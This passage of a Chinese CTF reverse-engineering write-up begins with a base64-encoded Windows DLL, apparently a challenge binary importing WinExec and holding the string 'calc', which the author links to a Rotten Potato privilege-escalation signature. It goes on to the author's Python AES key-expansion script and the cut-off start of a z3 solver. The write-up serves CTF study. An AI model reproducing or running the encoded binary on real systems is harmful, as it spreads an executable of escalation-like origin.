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&quot;);</span><br><span class="line">Set-Content &quot;C:\\Users\\23957\\Desktop\\reverse\\20201122.tmp&quot; $cont -Encoding byte</span><br></pre></td></tr></table></figure>
<p> &emsp;生成的tmp文件是：</p>
<p><img src="/images/re-part-5/image-20221209174946102-16798020973221.png" alt="image-20221209174946102"></p>
<p> &emsp;die和exeinfope都看不出来，查了查，是烂土豆提权的特征码，开头缺了0x4d5a，加上之后，说是32位的动态链接库。</p>
<p> &emsp;参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://zwz12138.github.io/2021/09/27/windows-linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%91%BD%E4%BB%A4%E4%BB%A5%E5%8F%8A%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95-%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89/">https://zwz12138.github.io/2021/09/27/windows-linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%91%BD%E4%BB%A4%E4%BB%A5%E5%8F%8A%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95-%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89/</a></p>
<p> &emsp;然后就定位到了：</p>
<p><img src="/images/re-part-5/image-20221216193020224-16798020973223.png" alt="image-20221216193020224"></p>
<p> &emsp;其中主要就是<code>sub_10001140</code>和<code>sub_10001260</code>这两个函数，分析了两周都没啥进展，中间还想着用z3去解，但是始终没写出脚本，最后看了看wp，妈的是AES加密。再回头看我写的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">a1 = [0 for i in range(196)]</span><br><span class="line">a2 = [0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0XD2, 0XA6, 0XAB, 0XF7, 0X15, 0X88, 0X09, 0XCF, 0X4F, 0X3C]</span><br><span class="line">def sub_10001140():</span><br><span class="line">    global a1, a2</span><br><span class="line">    array_1 = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]</span><br><span class="line">    array_2 = [0x8D, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D]</span><br><span class="line">    for id, it in enumerate(a2):</span><br><span class="line">        a1[id] = it</span><br><span class="line">    v4 = 4</span><br><span class="line">    result = 13</span><br><span class="line">    while True:</span><br><span class="line">        v7 = a1[result - 1]</span><br><span class="line">        v8 = a1[result + 1]</span><br><span class="line">        v9 = a1[result + 2]</span><br><span class="line">        v10 = a1[result]</span><br><span class="line">        if v4 % 4 == 0:</span><br><span class="line">            v10 = array_1[a1[result + 1]]</span><br><span class="line">            v7 = array_1[a1[result]] ^ array_2[v4 &gt;&gt; 2]</span><br><span class="line">            v8 = array_1[a1[result + 2]]</span><br><span class="line">            v9 = array_1[a1[result - 1]]</span><br><span class="line">        v4 += 1</span><br><span class="line">        a1[result + 3] = v7 ^ a1[result - 13]</span><br><span class="line">        a1[result + 4] = v10 ^ a1[result - 12]</span><br><span class="line">        a1[result + 5] = v8 ^ a1[result - 11]</span><br><span class="line">        a1[result + 6] = v9 ^ a1[result - 10]</span><br><span class="line">        result += 4</span><br><span class="line">        if v4 &gt;= 0x2c:</span><br><span class="line">            break</span><br><span class="line">    print(a1)</span><br><span class="line"></span><br><span class="line">sub_10001140()</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">[43, 126, 21, 22, 40, 174, 210, 166, 171, 247, 21, 136, 9, 207, 79, 60, 160, 250, 254, 23, 136, 84, 44, 177, 35, 163, 57, 57, 42, 108, 118, 5, 242, 194, 149, 242, 122, 150, 185, 67, 89, 53, 128, 122, 115, 89, 246, 127, 61, 128, 71, 125, 71, 22, 254, 62, 30, 35, 126, 68, 109, 122, 136, 59, 239, 68, 165, 65, 168, 82, 91, 127, 182, 113, 37, 59, 219, 11, 173, 0, 212, 209, 198, 248, 124, 131, 157, 135, 202, 242, 184, 188, 17, 249, 21, 188, 109, 136, 163, 122, 17, 11, 62, 253, 219, 249, 134, 65, 202, 0, 147, 253, 78, 84, 247, 14, 95, 95, 201, 243, 132, 166, 79, 178, 78, 166, 220, 79, 234, 210, 115, 33, 181, 141, 186, 210, 49, 43, 245, 96, 127, 141, 41, 47, 172, 119, 102, 243, 25, 250, 220, 33, 40, 209, 41, 65, 87, 92, 0, 110, 208, 20, 249, 168, 201, 238, 37, 137, 225, 63, 12, 200, 182, 99, 12, 166, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a1 = [0 for i in range(16)]</span><br><span class="line">a2 = [43, 126, 21, 22, 40, 174, 210, 166, 171, 247, 21, 136, 9, 207, 79, 60, 160, 250, 254, 23, 136, 84, 44, 177, 35, 163, 57, 57, 42, 108, 118, 5, 242, 194, 149, 242, 122, 150, 185, 67, 89, 53, 128, 122, 115, 89, 246, 127, 61, 128, 71, 125, 71, 22, 254, 62, 30, 35, 126, 68, 109, 122, 136, 59, 239, 68, 165, 65, 168, 82, 91, 127, 182, 113, 37, 59, 219, 11, 173, 0, 212, 209, 198, 248, 124, 131, 157, 135, 202, 242, 184, 188, 17, 249, 21, 188, 109, 136, 163, 122, 17, 11, 62, 253, 219, 249, 134, 65, 202, 0, 147, 253, 78, 84, 247, 14, 95, 95, 201, 243, 132, 166, 79, 178, 78, 166, 220, 79, 234, 210, 115, 33, 181, 141, 186, 210, 49, 43, 245, 96, 127, 141, 41, 47, 172, 119, 102, 243, 25, 250, 220, 33, 40, 209, 41, 65, 87, 92, 0, 110, 208, 20, 249, 168, 201, 238, 37, 137, 225, 63, 12, 200, 182, 99, 12, 166, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="line">target = [0X1F, 0XEA, 0XC7, 0X79, 0X55, 0X3B, 0XF8, 0X82, 0X51, 0XB3, 0X54, 0X80, 0XCF, 0XA6, 0XB6, 0X75]</span><br><span class="line"></span><br><span class="line">def equationSolver(begin:int, a1:list):</span><br><span class="line">    a0_old = BitVec(&#x27;a0_old&#x27;, 8)</span><br><span class="line">    a1_old = BitVec(&#x27;a1_old&#x27;, 8)</span><br><span class="line">    a2_old = BitVec(&#x27;a2_old&#x27;, 8)</span><br><span class="line">    a3_old = BitVec(&#x27;a3_old&#x27;, 8)</span><br><span class="line"></span><br><span class="line">    